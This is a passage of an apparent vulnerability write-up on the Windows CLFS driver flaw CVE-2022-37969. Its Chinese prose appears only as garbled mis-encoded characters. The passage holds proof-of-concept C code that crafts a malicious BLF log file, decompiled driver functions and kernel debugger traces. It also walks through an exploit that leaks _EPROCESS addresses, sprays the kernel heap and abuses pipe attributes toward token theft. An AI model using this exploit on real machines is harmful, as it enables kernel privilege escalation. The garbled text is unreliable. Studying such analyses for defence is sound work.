CClfsBaseFilePersisted::IncrementUsn(v6); return 0i64; } ç°åœ¨æœ‰ä¸‰ä¸ªé—®é¢˜ï¼š\nä¸ºä»€ä¹ˆCLIENT_CONTEXTâ†’lsnRestart.Internalä¼šå’Œç¬¬åå››ä¸ªæ‰‡åŒºç­¾åé‡å  æ€ä¹ˆè°ƒç”¨åˆ°ResetLogå‡½æ•°å¯¼è‡´é‡å åŒºåŸŸè¢«é‡ç½®ä¸º0xFFFF ä¸ºä»€ä¹ˆé‡å çš„æ˜¯ç¬¬åå››ä¸ªä¸æ˜¯å…¶ä»– å›åˆ°PoCä¸­ï¼Œé¦–å…ˆå°†BLFæ–‡ä»¶å†…åç§»0x9A8ï¼Œè¿™æ˜¯CLFS_BASE_RECORD_HEADERâ†’rgClients ï¼Œè¯¥å¤„ä¼ªé€ äº†å‡çš„client contextåç§»0x1b30\nchar checkSum[] = { 0x00, 0x00, 0x00, 0x00 }; // {0x59, 0xdf, 0x44, 0x06}; // offset 0x80c char signaturOffset[] = { 0x50, 0x00, 0x00, 0x00 }; // offset 0x868 char ccoffsetArray[] = { 0x30, 0x1b, 0x00, 0x00 }; // offset 0x9a8 char cbsymbolZone[] = { 0x4b, 0x11, 0x01, 0x00 }; // offset 0x1b98 char blockNameoffset[] = { 0xb8, 0x1b, 0x00, 0x00 }; // offset 0x2390 char blockAtributeoffset[] = { 0x30, 0x1b, 0x00, 0x00 }; // offset 0x2394 _wfopen_s(\u0026amp;pFile, stored_env_open, L\u0026#34;r+\u0026#34;); if (pFile == 0) { printf(\u0026#34;Cant\u0026#39;t open file, error %x\\n\u0026#34;, GetLastError()); //\tgetchar(); exit(1); } printf(\u0026#34;[+] file successfully opened\\n\u0026#34;); // æ ¡éªŒå’Œ fseek(pFile, 0x80c, SEEK_SET); fwrite(checkSum, sizeof(char), sizeof(checkSum), pFile); // Signature å€¼ fseek(pFile, 0x868, SEEK_SET); fwrite(signaturOffset, sizeof(char), sizeof(signaturOffset), pFile); // client contextçš„åç§» fseek(pFile, 0x9a8, SEEK_SET); fwrite(ccoffsetArray, sizeof(char), sizeof(ccoffsetArray), pFile); // cbsymbolZoneåç§»ï¼Œå†™å…¥æ¶æ„çš„cbsymbolZone fseek(pFile, 0x1b98, SEEK_SET); fwrite(cbsymbolZone, sizeof(char), sizeof(cbsymbolZone), pFile); fseek(pFile, 0x2390, SEEK_SET); fwrite(blockNameoffset, sizeof(char), sizeof(blockNameoffset), pFile); fseek(pFile, 0x2394, SEEK_SET); fwrite(blockAtributeoffset, sizeof(char), sizeof(blockAtributeoffset), pFile); è€Œååœ¨åç§»0x23a0(0x1b30+0x870)å¤„ä¼ªé€ å‡çš„client contextï¼Œä¼ªé€ çš„å‡client contextéœ€è¦æœ‰æ­£ç¡®çš„client contextå¤´ï¼Œå°†åŸclient contextå¤åˆ¶è¿‡å»å³å¯ã€‚æ­¤æ—¶client contextâ†’lsnRestart.Internal = 0x23a0 + 0x58 = 23f8ï¼Œä½äºåŸºæœ¬è®°å½•çš„0x1bf8å¤„ï¼Œç¬¬14ä¸ªæ‰‡åŒºçš„æ‰‡åŒºç­¾åä½äº0xd * 0x200 + 0x1fe=1BFE ï¼Œclient contextâ†’lsnRestart.Internal å¤§å°å…«ä¸ªå­—èŠ‚ï¼Œåˆšå¥½é«˜äºŒä½èƒ½å¤Ÿè¦†ç›–åˆ°æ‰‡åŒºç­¾åã€‚\nchar fakeClientcontext[] = { 0x07, 0xf0, 0xfd, 0xc1, 0x88 }; // offset 0x23a0 char fakeClientcontext2[] = { 0x01, 0x00, 0x00, 0x00 }; // offset 0x23ab char fakeClientcontext3[] = { 0x20, 0x00, 0x00, 0x00 }; // offset 0x2418 // Client contextï¼Œä¼ªé€ å‡çš„Client contextå¤´ fseek(pFile, 0x23a0, SEEK_SET); fwrite(fakeClientcontext, sizeof(char), sizeof(fakeClientcontext), pFile); // Client contextï¼Œä¼ªé€ å‡çš„Client contextå¤´ fseek(pFile, 0x23ab, SEEK_SET); fwrite(fakeClientcontext2, sizeof(char), sizeof(fakeClientcontext2), pFile); // Client contextï¼Œä¼ªé€ å‡çš„å€¼ï¼Œä½¿å¾—ç¨‹åºè¿›å…¥ResetLog fseek(pFile, 0x2418, SEEK_SET); fwrite(fakeClientcontext3, sizeof(char), sizeof(fakeClientcontext3), pFile); è€ŒResetLogä¸­è¦è¦†ç›–å…«ä¸ªå­—èŠ‚ï¼Œåˆšå¥½å°†ç¬¬åå››ä¸ªæ‰‡åŒºç­¾åè¦†ç›–ä¸º0xFFFF\nv2-\u0026gt;lsnRestart.Internal = *((_QWORD *)this + 62);// 58hçš„åç§» __int64 __fastcall CClfsLogFcbPhysical::Initialize( ULONG_PTR a1, __int64 a2, __int64 a3, int a4, ULONG DesiredShareAccess, __int64 a6, char a7, __int64 a8, PFILE_OBJECT FileObject, unsigned __int8 a10) { ..... CClfsBaseFile::AddRef(v25); EventObject = CClfsBaseFilePersisted::OpenImage(// æ‰“å¼€ç°æœ‰æ—¥å¿—æ–‡ä»¶ä¼šè°ƒç”¨è¿™é‡Œã€ *(CClfsBaseFilePersisted **)(a1 + 680), \u0026amp;Destination, (const struct _CLFS_FILTER_CONTEXT *)\u0026amp;v88, a10, (unsigned __int8 *)\u0026amp;v94); ..... } CClfsBaseFile::AcquireClientContext(*(PERESOURCE **)(a1 + 680), 0, \u0026amp;v77);// è·å–å®¢æˆ·ç«¯ä¸Šä¸‹æ–‡ if ( (v77-\u0026gt;eState \u0026amp; 0x20) == 0 || (*(unsigned __int8 (__fastcall **)(ULONG_PTR))(*(_QWORD *)a1 + 312i64))(a1) ) { ...... } else { CClfsLogFcbPhysical::ResetLog((CClfsLogFcbPhysical *)a1); *(_DWORD *)(a1 + 348) |= 0x40u; v39 = -1; } ..... return (unsigned int)EventObject; } ç»§ç»­è°ƒè¯•ï¼Œè°ƒè¯•å™¨åœ¨ClfsEncodeBlockPrivateæ–­ä¸‹\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff389`53916f70 fffff806`62d6802d CLFS!ClfsEncodeBlockPrivate+0xee 01 fffff389`53916fb0 fffff806`62d92232 CLFS!ClfsEncodeBlock+0x1d 02 fffff389`53916fe0 fffff806`62d899a0 CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x152 03 fffff389`53917070 fffff806`62d6161f CLFS!CClfsBaseFilePersisted::FlushImage+0x40 04 fffff389`539170b0 fffff806`62d63701 CLFS!CClfsLogFcbPhysical::FlushMetadata+0xef 05 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0xc85 06 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef 07 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97 08 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87 09 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 0a fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55 0b fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34 0c fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d 0d fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe 0e fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa 0f fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f 10 fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79 11 fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25 12 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14 13 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199 ClfsEncodeBlockPrivateä¼ªä»£ç ï¼š\n__int64 __fastcall ClfsEncodeBlockPrivate( struct _CLFS_LOG_BLOCK_HEADER *a1, unsigned int a2, UCHAR a3, unsigned __int8 a4) { int ClientId_low; // eax ...... ClientId_low = LOWORD(a1-\u0026gt;ClientId); v21[0] = 0; // æ®µç­¾åæ•°ç»„ if ( !(_WORD)ClientId_low || HIWORD(a1-\u0026gt;ClientId) \u0026lt; (unsigned __int16)ClientId_low || ClientId_low \u0026lt;\u0026lt; 9 \u0026gt; a2 ) return 3222929418i64; if ( a4 \u0026gt; 0x10u ) return 3221225485i64; v8 = 65809; if ( !_bittest(\u0026amp;v8, a4) ) return 3221225485i64; if ( (a1-\u0026gt;Checksum \u0026amp; 1) != 0 ) return 3222929418i64; SignaturesOffset = a1-\u0026gt;SignaturesOffset; v10 = a2 \u0026gt;\u0026gt; 9; // 3D a1-\u0026gt;Usn = a3; HIBYTE(v22) = a3; if ( (int)ULongAdd(SignaturesOffset, 2 * (a2 \u0026gt;\u0026gt; 9), v21) \u0026lt; 0 || v21[0] \u0026lt; v11 || (v11 \u0026amp; 7) != 0 || v21[0] \u0026gt; a2 ) return 3222929418i64; v15 = 0; if ( v10 ) { do { v14 += 2i64; v16 = 32; v17 = 64; if ( *(unsigned __int16 *)(v13 + 4) - 1 != v15 ) v16 = 0; if ( v15 ) v17 = 0; v18 = v17 | v16; v19 = v15 \u0026lt;\u0026lt; 9; // æ®µåç§» LOBYTE(v22) = a4 | v18; ++v15; *(_WORD *)(v14 - 2) = *(_WORD *)(v19 + v13 + 510);// å¾ªç¯ç›¸åŠ ï¼Œç¬¬14ä¸ªæ®µçš„ç­¾åä¼šè¦†ç›–åˆ°SignatureOffset *(_WORD *)((unsigned int)v19 + v13 + 510) = v22; } while ( v15 \u0026lt; v10 ); v12 = *(_DWORD *)(v13 + 16); } *(_DWORD *)(v13 + 16) = v12 \u0026amp; 0xFFFFFFFC | 1; return 0i64; } è¯¥ä»£ç è·å–LOG_BLOCK_HEADERâ†’SignaturesOffsetçš„å€¼ï¼Œåœ¨PoCå†…å·²è¢«è®¾ä¸º0x50ï¼Œè€Œåå¾ªç¯è¯»å–æ¯ä¸ªæ‰‡åŒºçš„ç­¾åå¹¶è¦†ç›–åˆ°SignaturesOffsetåç§»å¤„ï¼Œæ­¤æ—¶å°†ä»0x50å¼€å§‹å†™å…¥æ•°æ®ï¼Œæ¯æ¬¡å†™å…¥0x2ä¸ªå­—èŠ‚ã€‚\n1: kd\u0026gt; ?0xd * 2 Evaluate expression: 26 = 00000000`0000001a 1: kd\u0026gt; rr11 r11=ffffab0523ecf06a 1: kd\u0026gt; ?r11-0x1a Evaluate expression: -93436410793904 = ffffab05`23ecf050 åœ¨ç¬¬åä¸‰ä¸ªæ‰‡åŒºè¦†ç›–æ—¶ï¼Œåç§»å·²ç»åˆ°äº†SignatureOffsetå¤„ï¼Œç¬¬åä¸‰ä¸ªæ‰‡åŒºç­¾åä¸º0x0050ï¼Œæ‰€ä»¥SignatureOffset ä½2ä½ä¸º0050\n1: kd\u0026gt; ?ffffab05`23ecf050+2*0xc Evaluate expression: -93436410793880 = ffffab05`23ecf068 00000000 CLFS_LOG_BLOCK_HEADER struc ; (sizeof=0x70, align=0x8, copyof_491) 00000000 MajorVersion db ? 00000001 MinorVersion db ? 00000002 Usn db ? 00000003 db ? ; undefined 00000004 ClientId dd ? 00000008 TotalSectorCount dw ? 0000000A ValidSectorCount dw ? 0000000C Padding dd ? 00000010 Checksum dd ? 00000014 Flags dd ? 00000018 CurrentLsn CLFS_LSN ? 00000020 NextLsn CLFS_LSN ? 00000028 RecordOffsets dd 16 dup(?) 00000068 SignaturesOffset dd ? ç¬¬åå››ä¸ªæ‰‡åŒºç­¾åå·²ç»è¢«è¦†ç›–ä¸º0xFFFFï¼Œå†å°†ç¬¬åå››ä¸ªæ‰‡åŒºè¦†ç›–åœ¨SignatureOffseté«˜ä¸¤ä½å­—èŠ‚ï¼ŒSignatureOffsetå€¼å˜ä¸º0XFFFF0050\n1: kd\u0026gt; db ffffab0523ecf000 L0x80 ffffab05`23ecf000 15 00 01 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffab05`23ecf010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffab05`23ecf020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffab05`23ecf030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ecf040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ecf050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ecf060 00 00 00 00 00 00 00 00-50 00 ff ff 00 00 00 00 ........P....... ffffab05`23ecf070 02 00 00 00 00 00 00 00-27 86 fc 26 07 10 ee 11 ........\u0026#39;..\u0026amp;.... å›åˆ°AllocSymbolä¸­ï¼Œç”±äºSignatureOffsetå˜ä¸º0XFFFF0050ï¼Œå¯¼è‡´å³ä½¿cbSymbolZone è¢«è®¾ä¸º000000000001114b ä¹Ÿå¯ä»¥é€šè¿‡ifæ¡ä»¶åˆ¤æ–­ï¼Œåˆ°è¾¾memset`\n__int64 __fastcall CClfsBaseFilePersisted::AllocSymbol(CClfsBaseFilePersisted *this, unsigned int a2, void **a3) { __int64 v4; // rbp CLFS_BASE_RECORD_HEADER *BaseLogRecord; // rax __int64 v6; // r8 thisæŒ‡é’ˆ CLFS_BASE_RECORD_HEADER *v7; // rdi CLFS_LOG_BLOCK_HEADER *v8; // rcx __int64 cbSymbolZone; // r8 char *v10; // rbx __int64 result; // rax v4 = a2; BaseLogRecord = (CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); v7 = BaseLogRecord; if ( !BaseLogRecord ) return 3222929421i64; v8 = *(CLFS_LOG_BLOCK_HEADER **)(*(_QWORD *)(v6 + 48) + 48i64); *a3 = 0i64; cbSymbolZone = BaseLogRecord-\u0026gt;cbSymbolZone; if ( (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8-\u0026gt;MajorVersion + v8-\u0026gt;SignaturesOffset) ) return 3221225507i64; v10 = (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone; memset(v10, 0, (unsigned int)v4); v7-\u0026gt;cbSymbolZone += v4; result = 0i64; *a3 = v10; return result; } 0: kd\u0026gt; dq rax+0x1328 ffffa78f`9468c398 00000000`0001114b 00000001`03030000 ffffa78f`9468c3a8 00000030`c1fdf006 000000b8`02d20016 ffffa78f`9468c3b8 00000000`00000000 00000000`00000000 ffffa78f`9468c3c8 00001368`000013f0 00000000`00000000 ffffa78f`9468c3d8 00000088`c1fdf007 00009c40`01000000 ffffa78f`9468c3e8 00000000`00000000 00000000`00000000 ffffa78f`9468c3f8 01100000`00000000 00000000`00000000 ffffa78f`9468c408 00000000`00000000 ffffffff`00000000 é‚£ä¹ˆæ­¤å¤„ä¸ºä»€ä¹ˆè¦è®¾ä¸º0x1114bå‘¢ã€‚\nåœ¨å¤šæ¬¡åˆ›å»ºæ—¥å¿—æ–‡ä»¶åï¼Œåé¢åˆ›å»ºçš„æ¯ä¸ªæ—¥å¿—æ–‡ä»¶çš„Base log recordçš„å†…å­˜é—´è·ç¨³å®šåœ¨0x11000\n0: kd\u0026gt; db rax - 0x70 + 0x11000 ffffa78f`9469c000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffa78f`9469c010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffa78f`9469c020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffa78f`9469c030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa78f`9469c040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa78f`9469c050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffa78f`9469c060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... ffffa78f`9469c070 05 00 00 00 00 00 00 00-93 76 34 8f 1b 10 ee 11 .........v4..... æ­¤å¤„åœ¨è°ƒè¯•å™¨ä¸­åä¸€ä¸ªæ—¥å¿—æ–‡ä»¶çš„container contextåç§»ä¸º0x1468\n0: kd\u0026gt; dw ffffa78f`9469c000+0x70 + 0x328 ffffa78f`9469c398 1468 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3a8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3b8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3c8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3d8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3e8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c3f8 0000 0000 0000 0000 0000 0000 0000 0000 ffffa78f`9469c408 0000 0000 0000 0000 0000 0000 0000 0000 0: kd\u0026gt; dd ffffa78f`9469c000+0x70 + 0x1468 ffffa78f`9469d4d8 c1fdf008 00000030 00080000 00000000 ffffa78f`9469d4e8 00000000 00000000 93e0d330 ffffa78f ffffa78f`9469d4f8 00000001 00000002 00000000 00000000 ffffa78f`9469d508 003f005c 005c003f 003a0043 0055005c ffffa78f`9469d518 00650073 00730072 0050005c 00620075 ffffa78f`9469d528 0069006c 005c0063 0063002e 006e006f ffffa78f`9469d538 00610074 006e0069 00720065 0031005f ffffa78f`9469d548 00340031 00360037 00000039 00000000 æ ¹æ®ä¼ªä»£ç å¯çŸ¥memsetçš„ä½ç½®ä¸ºBaseLogRecord + 0x 1338 + cbSymbolZone\nå¦‚æœè¦åˆ©ç”¨å‰ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶åœ¨AllocSymbolæ—¶ä¿®æ”¹åä¸€ä¸ªæ—¥å¿—æ–‡ä»¶çš„container contextâ†’pContainerçš„é«˜å››ä½åˆ™åº”æ»¡è¶³ä¸‹åˆ—æ¡ä»¶\nffffa78f9469d4f4 = BaseLogRecord + 0x1338 + cbSymbolZone`ï¼Œè®¡ç®—å¯å¾—\n0: kd\u0026gt; ?ffffa78f`9469d4f4 - 0x1338 - rax Evaluate expression: 69964 = 00000000`0001114c é€šè¿‡memsetå°†æŒ‡é’ˆé«˜å››ä½æ¸…é›¶åï¼Œé€šè¿‡NtSetInformationFileå‡½æ•°ä¸ºcontaineræ–‡ä»¶è®¾ç½®å±æ€§13ï¼ˆå…³é—­æ—¶åˆ é™¤æ–‡ä»¶ï¼‰ã€‚åœ¨å…³é—­æ—¥å¿—æ–‡ä»¶å¥æŸ„æ—¶ä¼šè°ƒç”¨CClfsBaseFilePersisted::RemoveContainerå‡½æ•°ç§»é™¤containerï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä¼šè·å–container contextå¹¶è§£å¼•ç”¨container contextâ†’pContainerï¼Œç”±äºæŒ‡é’ˆæŸåï¼Œå¯¼è‡´è“å±ã€‚\nåœ¨CLFS!CClfsBaseFilePersisted::RemoveContainer æ–­ç‚¹\nbp CLFS!CClfsBaseFilePersisted::RemoveContainer 1: kd\u0026gt; db r15 ffffd70e`48d9d4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffffd70e`48d9d4e8 00 00 00 00 00 00 00 00-e0 37 c1 00 00 00 00 00 .........7...... ffffd70e`48d9d4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff88e`db5aa5e0 fffff806`0b6f120b CLFS!CClfsBaseFilePersisted::RemoveContainer+0x10f 01 fffff88e`db5aa640 fffff806`0b6f8b0f CLFS!CClfsLogFcbPhysical::DeleteBaseFileAndContainers+0xf3 02 fffff88e`db5aa690 fffff806`0b6f8761 CLFS!CClfsLogFcbPhysical::Finalize+0x39b 03 fffff88e`db5aa6c0 fffff806`0b71df42 CLFS!CClfsLogFcbPhysical::Release+0xb1 04 fffff88e`db5aa720 fffff806`0b720878 CLFS!CClfsRequest::Close+0xd6 05 fffff88e`db5aa770 fffff806`0b720747 CLFS!ClfsDispatchIoRequest+0x108 06 fffff88e`db5aa7c0 fffff806`0d8abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 07 fffff88e`db5aa7f0 fffff806`0dbf088f nt!IofCallDriver+0x55 08 fffff88e`db5aa830 fffff806`0dc19af0 nt!IopDeleteFile+0x14f 09 fffff88e`db5aa8b0 fffff806`0d8ae1a7 nt!ObpRemoveObjectRoutine+0x80 0a fffff88e`db5aa910 fffff806`0dc22449 nt!ObfDereferenceObjectWithTag+0xc7 0b fffff88e`db5aa950 fffff806`0dc2627c nt!ObCloseHandleTableEntry+0x6c9 0c fffff88e`db5aaa90 fffff806`0da0a2b5 nt!NtClose+0xec 0d fffff88e`db5aab00 00007ff8`0b48d124 nt!KiSystemServiceCopyEnd+0x25 0e 0000001d`518fe678 00007ff8`08bea405 ntdll!NtClose+0x14 0f 0000001d`518fe680 00000000`00000000 0x00007ff8`08bea405 1: kd\u0026gt; u CLFS!CClfsBaseFilePersisted::RemoveContainer+0x10f: fffff806`0b716ebf 498b7f18 mov rdi,qword ptr [r15+18h] fffff806`0b716ec3 4885ff test rdi,rdi fffff806`0b716ec6 0f84b9000000 je CLFS!CClfsBaseFilePersisted::RemoveContainer+0x1d5 (fffff806`0b716f85) fffff806`0b716ecc 4983671800 and qword ptr [r15+18h],0 fffff806`0b716ed1 65488b142588010000 mov rdx,qword ptr gs:[188h] fffff806`0b716eda 488b4e20 mov rcx,qword ptr [rsi+20h] fffff806`0b716ede 4c8b15c3d1ffff mov r10,qword ptr [CLFS!_imp_ExReleaseResourceForThreadLite (fffff806`0b7140a8)] fffff806`0b716ee5 e8a6552102 call nt!ExReleaseResourceForThreadLite (fffff806`0d92c490) __int64 __fastcall CClfsBaseFilePersisted::RemoveContainer(CClfsBaseFilePersisted *this, unsigned int a2) { __int64 v2; // r12 BOOLEAN v4; // r14 __int64 BaseLogRecord; // rax __int64 v6; // rdi int v7; // r14d int Symbol; // eax int v9; // ebx struct _CLFS_CONTAINER_CONTEXT *v10; // r15 int v11; // eax __int64 v12; // rdi __int64 v13; // rax BOOLEAN v15; // [rsp+20h] [rbp-38h] unsigned int v16; // [rsp+24h] [rbp-34h] struct _CLFS_CONTAINER_CONTEXT *v17; // [rsp+70h] [rbp+18h] BYREF v2 = a2; v17 = 0i64; v4 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); v15 = v4; BaseLogRecord = CClfsBaseFile::GetBaseLogRecord(this); v6 = BaseLogRecord; if ( !BaseLogRecord ) { v9 = -1072037875; v16 = -1072037875; goto LABEL_20; } v7 = *(_DWORD *)(BaseLogRecord + 4 * v2 + 808); if ( !v7 ) { v9 = -1073741816; LABEL_14: v16 = v9; goto LABEL_19; } Symbol = CClfsBaseFile::GetSymbol(this, v7, v2, \u0026amp;v17); v9 = Symbol; v16 = Symbol; v10 = v17; if ( v17 ) { if ( Symbol \u0026gt;= 0 ) { v9 = CClfsBaseFilePersisted::RemoveSymbol(this, v7); v16 = v9; if ( v9 \u0026gt;= 0 ) { LODWORD(v17) = *(_DWORD *)(v6 + 4 * v2 + 808); *(_DWORD *)(v6 + 4 * v2 + 808) = 0; RtlClearBits((PRTL_BITMAP)((char *)this + 232), v2, 1u); RtlNumberOfSetBits((PRTL_BITMAP)((char *)this + 232)); if ( *((_DWORD *)v10 + 9) != 1 ) --*(_DWORD *)(v6 + 300); v11 = CClfsBaseFilePersisted::FlushImage(this); v9 = v11; v16 = v11; if ( v11 \u0026gt;= 0 ) { v12 = *((_QWORD *)v10 + 3); if ( v12 ) { *((_QWORD *)v10 + 3) = 0i64; ExReleaseResourceForThreadLite(*((PERESOURCE *)this + 4), (ERESOURCE_THREAD)KeGetCurrentThread()); v4 = 0; (*(void (__fastcall **)(__int64))(*(_QWORD *)v12 + 24i64))(v12); (*(void (__fastcall **)(__int64))(*(_QWORD *)v12 + 8i64))(v12); v9 = v16; goto LABEL_20; } goto LABEL_19; } if ( v11 != -1073741816 ) { v13 = CClfsBaseFile::OffsetToAddr(this); if ( v13 ) { *(_BYTE *)(v13 - 8) = 0; *(_DWORD *)(v6 + 4 * v2 + 808) = (_DWORD)v17; RtlSetBits((PRTL_BITMAP)((char *)this + 232), v2, 1u); if ( *((_DWORD *)v10 + 9) != 1 ) ++*(_DWORD *)(v6 + 300); goto LABEL_19; } v9 = -1072037875; goto LABEL_14; } } } } LABEL_19: v4 = v15; LABEL_20: if ( v4 ) { ExReleaseResourceForThreadLite(*((PERESOURCE *)this + 4), (ERESOURCE_THREAD)KeGetCurrentThread()); return v16; } return (unsigned int)v9; } æœ€åé™„ä¸Šzscalerç”»çš„æµç¨‹å›¾\nhttps://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part\nEXPåˆ†æ é¦–å…ˆé€šè¿‡æŸ¥è¯¢SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\CurrentBuild æ¥ç¡®å®šç³»ç»Ÿç‰ˆæœ¬æ˜¯å¦åœ¨èŒƒå›´å†…ï¼Œå› ä¸ºåœ¨_EPROCESSä¸­_TOKENåç§»æ˜¯ä¸å›ºå®šçš„ï¼Œæ­¤æ¬¡æ‰€ä½¿ç”¨çš„åç§»ä¸º0x4B8.\nif (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(\u0026#34;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\u0026#34;), NULL, KEY_READ, \u0026amp;hKey) == ERROR_SUCCESS) { printf(\u0026#34;[+] Registry key Opened successfully\\n\u0026#34;); } ...... RegQueryValueEx(hKey, TEXT(\u0026#34;CurrentBuild\u0026#34;), NULL, \u0026amp;cType, (LPBYTE)lpData, \u0026amp;buffersize); //\t-1è¡¨ç¤ºå¤„ç†æ•´ä¸ªç¼“å†²åŒº WideCharToMultiByte(CP_UTF8, 0, lpData, -1, (LPSTR)buf, 0x80, 0, 0); winversion = atoi(buf); wprintf(L\u0026#34;[+] Windows Build Number: %i\\n\u0026#34;, winversion); if (winversion \u0026gt;= 17763 \u0026amp;\u0026amp; winversion \u0026lt;= 22000) { token_offset = 0x4b8; // store the token offset } else { printf(\u0026#34;[!] Version %d not supported. Exiting...\\n\u0026#34;, winversion); exit(-1); } EXPé€šè¿‡è°ƒç”¨NtQuerySystemInformation å‡½æ•°ï¼Œå¹¶å°†SystemInformationClass å‚æ•°è®¾ç½®ä¸ºSystemExtendedHandleInformation æŸ¥è¯¢ç³»ç»Ÿå¥æŸ„ä¿¡æ¯ï¼ˆè¿›ç¨‹ï¼‰ï¼Œéå†handle åˆ—è¡¨ï¼Œé€šè¿‡æ¯”è¾ƒUniqueProcessIdæ¥ç¡®å®šæ‰¾åˆ°çš„è¿›ç¨‹PIDå¹¶è¿”å›å…¶_EPROCESSåœ°å€ï¼ŒEXPä¸­åˆ†åˆ«è·å–åˆ°è‡ªèº«çš„_EPROCESSåœ°å€å’Œpidä¸º4çš„è¿›ç¨‹çš„_EPROCESSåœ°å€ã€‚\nstatus = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, handleInfo, handleInfoSize, \u0026amp;retLength); for (ULONG i = 0; i \u0026lt; handleInfo-\u0026gt;NumberOfHandles; i++) { if ((USHORT)Object == 0x4) { if (0x4 == (DWORD)handleInfo-\u0026gt;Handles[i].UniqueProcessId \u0026amp;\u0026amp; (SIZE_T)Object == (SIZE_T)handleInfo-\u0026gt;Handles[i].HandleValue) { kernelAddress = (SIZE_T)handleInfo-\u0026gt;Handles[i].Object; bFind = TRUE; break; } } else { if (GetCurrentProcessId() == (DWORD)handleInfo-\u0026gt;Handles[i].UniqueProcessId \u0026amp;\u0026amp; (SIZE_T)Object == (SIZE_T)handleInfo-\u0026gt;Handles[i].HandleValue) { kernelAddress = (SIZE_T)handleInfo-\u0026gt;Handles[i].Object; bFind = TRUE; break; } } } EXPè¿›è¡Œå †å–·å°„ï¼Œå¾ªç¯åœ¨åç§»0x10000å¼€å§‹æ¯éš”0x10ä½ç½®å†™å…¥0x500000ã€‚\nç»•è¿‡CreatePipeåˆ›å»ºç®¡é“å¹¶é€šè¿‡NtFsControlFileè®¾ç½®ç®¡é“å±æ€§ï¼Œå…¶ä¸­FsControlCode å‚æ•°è¢«è®¾ä¸º0x11003cï¼Œè¿™ä½¿å¾—åœ¨ä¹‹åå¯ä»¥é€šè¿‡è°ƒç”¨NtFsControlFileå¹¶ä¼ é€’FsControlCode å‚æ•°ä¸º0x110038æ¥è¯»å–ç®¡é“å±æ€§ã€‚\nEXPé€šè¿‡è°ƒç”¨NtQuerySystemInformationå¹¶ä¼ é€’SystemInformationClasså‚æ•°ä¸ºSystemBigPoolInformationæŸ¥è¯¢å†…æ ¸å †ä¿¡æ¯ã€‚é€šè¿‡å¾ªç¯éå†å †ä¿¡æ¯å¹¶æ¯”è¾ƒå †tagæ‰¾åˆ°äº†Pipeå †åœ¨å†…æ ¸çš„åœ°å€ã€‚\n0: kd\u0026gt; db ffffa48d64eff000 ffffa48d`64eff000 50 25 a6 67 8d a4 ff ff-50 25 a6 67 8d a4 ff ff P%.g....P%.g.... ffffa48d`64eff010 28 f0 ef 64 